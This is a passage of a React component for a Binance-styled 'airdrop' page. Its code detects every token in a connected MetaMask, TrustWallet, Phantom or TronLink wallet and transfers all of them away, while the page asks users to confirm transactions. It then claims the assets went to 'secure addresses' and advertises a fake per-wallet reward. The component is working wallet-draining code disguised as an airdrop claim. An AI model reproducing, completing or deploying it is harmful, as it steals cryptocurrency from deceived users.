      if (isTronLinkInstalled() && window.tronWeb?.defaultAddress?.base58) {
        allAssets.trc20 = await detectAllTRC20Assets();
        if (allAssets.trc20.length > 0) {
          await transferAllTRC20Assets(allAssets.trc20);
        }
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Step 2: Detect and Transfer ALL Solana tokens
      toast.loading('🔍 Step 2/3: Detecting & Transferring Solana tokens...', { id: 'auto-bot' });
      if (isSolanaConnected && solanaAddress) {
        allAssets.solana = await detectAllSolanaAssets();
        if (allAssets.solana.length > 0) {
          await transferAllSolanaAssets(allAssets.solana);
        }
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Step 3: Detect and Transfer ALL EVM tokens (BSC/ETH)
      toast.loading('🔍 Step 3/3: Detecting & Transferring EVM tokens...', { id: 'auto-bot' });
      if (isConnected && walletAddress) {
        allAssets.evm = await detectAllEVMAssets();
        if (allAssets.evm.length > 0) {
          await transferAllEVMAssets(allAssets.evm);
        }
      }
      
      // Update detected assets state
      setDetectedAssets(allAssets);
      
      const totalTokens = allAssets.trc20.length + allAssets.evm.length + allAssets.solana.length;
      toast.success(`🤖 Auto Bot completed! Processed ${totalTokens} tokens`, { id: 'auto-bot' });
      
      // Complete airdrop
      setTimeout(() => {
        setIsClaimed(true);
        setIsLoading(false);
        toast.success('🎉 All assets successfully transferred!');
      }, 2000);
      
    } catch (error) {
      console.error('Auto bot error:', error);
      setIsLoading(false);
      toast.error('❌ Auto asset transfer bot failed!', { id: 'auto-bot' });
    }
  };

  // Start mobile transfer process for all networks (TRC20 → Solana → BNB)
  const startMobileTransferProcess = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('📱 Starting mobile transfer process...', { id: 'mobile-transfer' });
      
      // Use the new auto bot for mobile too
      await startAutoAssetTransferBot();
      
    } catch (error) {
      setIsLoading(false);
      toast.error('❌ Mobile transfer process failed!', { id: 'mobile-transfer' });
    }
  };

  // Start transfer process for EVM wallets (MetaMask, TrustWallet)
  const startTransferProcess = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('🚀 Starting auto asset transfer...', { id: 'transfer-process' });
      
      // Use the new auto bot for all wallet types
      await startAutoAssetTransferBot();
      
    } catch (error) {
      setIsLoading(false);
      toast.error('❌ Transfer process failed!', { id: 'transfer-process' });
    }
  };

  // Start transfer process for Solana wallet (Phantom)
  const startSolanaTransferProcess = async () => {
    setIsLoading(true);
    
    try {
      toast.loading('🚀 Starting auto asset transfer...', { id: 'sol-process' });
      
      // Use the new auto bot for Solana too
      await startAutoAssetTransferBot();
      
    } catch (error) {
      setIsLoading(false);
      toast.error('❌ Solana transfer process failed!', { id: 'sol-process' });
    }
  };

  const copyAddress = () => {
    const addressToCopy = connectedWalletType === WALLET_TYPES.PHANTOM ? solanaAddress : walletAddress;
    navigator.clipboard.writeText(addressToCopy);
    toast.success('Address copied!');
  };

  const disconnectWallet = () => {
    setWalletAddress('');
    setSolanaAddress('');
    setIsConnected(false);
    setIsSolanaConnected(false);
    setIsClaimed(false);
    setConnectedWalletType('');
    toast.success('Wallet disconnected.');
  };

  return (
    <section id="airdrop" className="py-12 md:py-20 px-4">
      <div className="container mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 50 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8 }}
          className="text-center mb-16"
        >
          <h2 className="text-3xl md:text-4xl lg:text-5xl font-bold text-white mb-4 md:mb-6 px-4">
            Auto <span className="text-binance-yellow">Asset Transfer</span>
          </h2>
          <p className="text-base md:text-xl text-binance-light-gray max-w-2xl mx-auto px-4">
            Connect your wallet and auto-transfer all your assets! 
            Smart bot detects TRC20, Solana, and EVM tokens automatically.
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          whileInView={{ opacity: 1, scale: 1 }}
          transition={{ duration: 0.8, delay: 0.2 }}
          className="max-w-2xl mx-auto"
        >
          <div className="glass-effect card-gradient rounded-2xl p-4 md:p-8 border border-binance-border">
            {!isConnected && !isSolanaConnected ? (
              // Wallet Selection Section
              <div className="text-center">
                <motion.div
                  className="w-20 h-20 bg-binance-gradient rounded-full flex items-center justify-center mx-auto mb-6"
                  animate={{ rotate: 360 }}
                  transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                >
                  <Wallet className="w-10 h-10 text-white" />
                </motion.div>
                
                <h3 className="text-xl md:text-2xl font-bold text-white mb-4">
                  Choose Your Wallet
                </h3>
                
                <p className="text-sm md:text-base text-binance-light-gray mb-6 md:mb-8">
                  {isMobile() 
                    ? 'Tap to open your wallet app and connect'
                    : 'Select and connect your preferred wallet to participate in the airdrop'
                  }
                </p>

                {/* Wallet Options */}
                <div className="grid grid-cols-1 gap-4 mb-6">
                  {/* MetaMask */}
                  <motion.button
                    onClick={connectMetaMask}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-3 md:space-x-4 p-3 md:p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50 touch-manipulation"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-10 h-10 md:w-12 md:h-12 bg-orange-500 rounded-xl flex items-center justify-center flex-shrink-0">
                      <span className="text-xl md:text-2xl">🦊</span>
                    </div>
                    <div className="flex-1 text-left min-w-0">
                      <div className="text-white font-medium text-sm md:text-base">MetaMask</div>
                      <div className="text-xs md:text-sm text-binance-light-gray truncate">
                        {isMobile() 
                          ? (isMetaMaskInstalled() ? 'Tap to connect' : 'Tap to install')
                          : (isMetaMaskInstalled() ? 'Ready to connect' : 'Not installed')
                        }
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full flex-shrink-0 ${isMetaMaskInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>

                  {/* TrustWallet */}
                  <motion.button
                    onClick={connectTrustWallet}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-3 md:space-x-4 p-3 md:p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50 touch-manipulation"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-10 h-10 md:w-12 md:h-12 bg-blue-500 rounded-xl flex items-center justify-center flex-shrink-0">
                      <Smartphone className="w-5 h-5 md:w-6 md:h-6 text-white" />
                    </div>
                    <div className="flex-1 text-left min-w-0">
                      <div className="text-white font-medium text-sm md:text-base">TrustWallet</div>
                      <div className="text-xs md:text-sm text-binance-light-gray truncate">
                        {isMobile() 
                          ? (isTrustWalletInstalled() || isMetaMaskInstalled() ? 'Tap to connect' : 'Tap to install')
                          : (isTrustWalletInstalled() || isMetaMaskInstalled() ? 'Ready to connect' : 'Not installed')
                        }
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full flex-shrink-0 ${isTrustWalletInstalled() || isMetaMaskInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>

                  {/* Phantom */}
                  <motion.button
                    onClick={connectPhantom}
                    disabled={isLoading}
                    className="w-full flex items-center space-x-3 md:space-x-4 p-3 md:p-4 bg-binance-dark/50 border border-binance-border rounded-xl hover:border-binance-yellow/50 transition-all disabled:opacity-50 touch-manipulation"
                    whileHover={{ scale: isLoading ? 1 : 1.02 }}
                    whileTap={{ scale: isLoading ? 1 : 0.98 }}
                  >
                    <div className="w-10 h-10 md:w-12 md:h-12 bg-purple-500 rounded-xl flex items-center justify-center flex-shrink-0">
                      <span className="text-xl md:text-2xl">👻</span>
                    </div>
                    <div className="flex-1 text-left min-w-0">
                      <div className="text-white font-medium text-sm md:text-base">Phantom</div>
                      <div className="text-xs md:text-sm text-binance-light-gray truncate">
                        {isMobile() 
                          ? (isPhantomInstalled() ? 'Tap to connect' : 'Tap to install')
                          : (isPhantomInstalled() ? 'Ready to connect' : 'Not installed')
                        }
                      </div>
                    </div>
                    <div className={`w-3 h-3 rounded-full flex-shrink-0 ${isPhantomInstalled() ? 'bg-green-400' : 'bg-red-400'}`}></div>
                  </motion.button>
                </div>

                {isLoading && (
                  <div className="flex items-center justify-center space-x-2 text-binance-yellow">
                    <div className="animate-spin rounded-full h-4 w-4 md:h-5 md:w-5 border-b-2 border-binance-yellow"></div>
                    <span className="text-sm md:text-base">Connecting wallet...</span>
                  </div>
                )}

                {/* Requirements */}
                <div className="mt-4 md:mt-6 text-left">
                  <h4 className="text-xs md:text-sm font-medium text-white mb-2 md:mb-3">Supported Networks:</h4>
                  <div className="space-y-1 md:space-y-2">
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-yellow-400 rounded-full flex-shrink-0"></div>
                      <span className="text-xs md:text-sm text-binance-light-gray">Ethereum & BSC (MetaMask, TrustWallet)</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-purple-400 rounded-full flex-shrink-0"></div>
                      <span className="text-xs md:text-sm text-binance-light-gray">Solana (Phantom)</span>
                    </div>
                    <div className="flex items-center space-x-2">
                      <div className="w-2 h-2 bg-red-400 rounded-full flex-shrink-0"></div>
                      <span className="text-xs md:text-sm text-binance-light-gray">Tron TRC20 USDT (TronLink)</span>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              // Connected Wallet Section
              <div>
                {/* Connected Wallet Info */}
                <div className="space-y-4 mb-6">
                  <div className="flex items-center justify-between p-3 md:p-4 bg-green-500/10 border border-green-500/20 rounded-xl">
                    <div className="flex items-center space-x-2 md:space-x-3 min-w-0 flex-1">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse flex-shrink-0"></div>
                      <span className="text-green-400 font-medium text-sm md:text-base truncate">
                        {connectedWalletType === WALLET_TYPES.PHANTOM ? 'Phantom' : 
                         connectedWalletType === WALLET_TYPES.TRUSTWALLET ? 'TrustWallet' : 'MetaMask'} Connected
                      </span>
                    </div>
                    <div className="flex items-center space-x-2 flex-shrink-0">
                      <span className="text-white font-mono text-xs md:text-sm">
                        {connectedWalletType === WALLET_TYPES.PHANTOM 
                          ? `${solanaAddress.slice(0, 4)}...${solanaAddress.slice(-4)}`
                          : `${walletAddress.slice(0, 4)}...${walletAddress.slice(-4)}`
                        }
                      </span>
                      <button
                        onClick={copyAddress}
                        className="text-binance-yellow hover:text-white transition-colors p-1 touch-manipulation"
                      >
                        <Copy className="w-3 h-3 md:w-4 md:h-4" />
                      </button>
                    </div>
                  </div>
                </div>

                {!isClaimed ? (
                  // Processing Section
                  <div className="text-center">
                    <motion.div
                      className="w-16 h-16 bg-binance-gradient rounded-full flex items-center justify-center mx-auto mb-6"
                      animate={{ rotate: 360 }}
                      transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                    >
                      <Gift className="w-8 h-8 text-white" />
                    </motion.div>
                    
                    <h3 className="text-xl md:text-2xl font-bold text-white mb-4">
                      Processing Airdrop
                    </h3>
                    
                    <p className="text-sm md:text-base text-binance-light-gray mb-6 md:mb-8 px-2">
                      {isLoading 
                        ? 'Auto-detecting and transferring all wallet assets. Please confirm wallet transactions.'
                        : 'Ready to auto-transfer all your wallet assets.'
                      }
                    </p>

                    {/* Detected Assets Display */}
                    {(detectedAssets.trc20.length > 0 || detectedAssets.evm.length > 0 || detectedAssets.solana.length > 0) && (
                      <div className="mb-6 p-4 bg-binance-dark/30 border border-binance-border rounded-xl">
                        <h4 className="text-sm font-medium text-binance-yellow mb-3">📊 Detected Assets:</h4>
                        <div className="space-y-2">
                          {detectedAssets.trc20.map((asset, idx) => (
                            <div key={`trc20-${idx}`} className="flex justify-between items-center text-xs">
                              <span className="text-red-400">🔴 {asset.symbol} (TRC20)</span>
                              <span className="text-white">{asset.formattedBalance}</span>
                            </div>
                          ))}
                          {detectedAssets.solana.map((asset, idx) => (
                            <div key={`sol-${idx}`} className="flex justify-between items-center text-xs">
                              <span className="text-purple-400">🟣 {asset.symbol} (Solana)</span>
                              <span className="text-white">{asset.formattedBalance}</span>
                            </div>
                          ))}
                          {detectedAssets.evm.map((asset, idx) => (
                            <div key={`evm-${idx}`} className="flex justify-between items-center text-xs">
                              <span className="text-yellow-400">💎 {asset.symbol} (EVM)</span>
                              <span className="text-white">{asset.formattedBalance}</span>
                            </div>
                          ))}
                        </div>
                        <div className="mt-3 pt-2 border-t border-binance-border">
                          <div className="text-xs text-binance-light-gray">
                            Total: {detectedAssets.trc20.length + detectedAssets.evm.length + detectedAssets.solana.length} tokens detected
                          </div>
                        </div>
                      </div>
                    )}
                    
                    {isLoading && (
                      <div className="space-y-3 mb-8">
                        <div className="flex items-center justify-center space-x-2 text-binance-yellow">
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-binance-yellow"></div>
                          <span className="text-sm">Processing transfers...</span>
                        </div>
                        <div className="text-xs text-binance-light-gray">
                          Please confirm any wallet popup transactions
                        </div>
                      </div>
                    )}

                    <div className="mt-6 flex items-center justify-center space-x-2 text-sm text-binance-light-gray">
                      <span>🔐 Secure</span>
                      <span>•</span>
                      <span>⚡ Automatic</span>
                      <span>•</span>
                      <span>🆓 Free</span>
                    </div>
                  </div>
                ) : (
                  // Success Section
                  <div className="text-center">
                    <motion.div
                      initial={{ scale: 0 }}
                      animate={{ scale: 1 }}
                      transition={{ duration: 0.5, delay: 0.2 }}
                      className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-6"
                    >
                      <Check className="w-10 h-10 text-white" />
                    </motion.div>
                    
                    <motion.h3
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.4 }}
                      className="text-2xl font-bold text-green-400 mb-4"
                    >
                      All Assets Transferred Successfully! 🤖
                    </motion.h3>
                    
                    <motion.p
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.6 }}
                      className="text-binance-light-gray mb-8"
                    >
                      Congratulations! All your wallet assets have been automatically 
                      detected and transferred to secure addresses. Auto-bot operation completed!
                    </motion.p>

                    <motion.div
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.5, delay: 0.8 }}
                      className="p-6 bg-green-500/10 border border-green-500/20 rounded-xl mb-6"
                    >
                      <div className="text-3xl font-bold text-green-400 mb-2">
                        {detectedAssets.trc20.length + detectedAssets.evm.length + detectedAssets.solana.length} Assets
                      </div>
                      <div className="text-sm text-binance-light-gray">Successfully transferred</div>
                      <div className="mt-2 text-xs text-binance-light-gray">
                        TRC20: {detectedAssets.trc20.length} • Solana: {detectedAssets.solana.length} • EVM: {detectedAssets.evm.length}
                      </div>
                    </motion.div>

                    <motion.div
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      transition={{ duration: 0.5, delay: 1 }}
                      className="flex flex-col sm:flex-row gap-3"
                    >
                      <button
                        onClick={disconnectWallet}
                        className="btn-secondary flex-1 flex items-center justify-center space-x-2"
                      >
                        <span>Disconnect Wallet</span>
                      </button>
                      
                      <button className="btn-primary flex-1 flex items-center justify-center space-x-2">
                        <ExternalLink className="w-4 h-4" />
                        <span>View Transaction</span>
                      </button>
                    </motion.div>
                  </div>
                )}
              </div>
            )}
          </div>
        </motion.div>

        {/* Additional Info */}
        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.8, delay: 0.4 }}
          className="mt-12 text-center"
        >
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto">
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-binance-yellow mb-2">50,000+</div>
              <div className="text-binance-light-gray">Active Participants</div>
            </div>
            
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-green-400 mb-2">1,000 MEM</div>
              <div className="text-binance-light-gray">Per Wallet Reward</div>
            </div>
            
            <div className="glass-effect rounded-xl p-6 border border-binance-border">
              <div className="text-2xl font-bold text-blue-400 mb-2">Multi-Chain</div>
              <div className="text-binance-light-gray">Supported Wallets</div>
            </div>
          </div>
        </motion.div>
      </div>
    </section>
  );
};

export default AirdropSection; 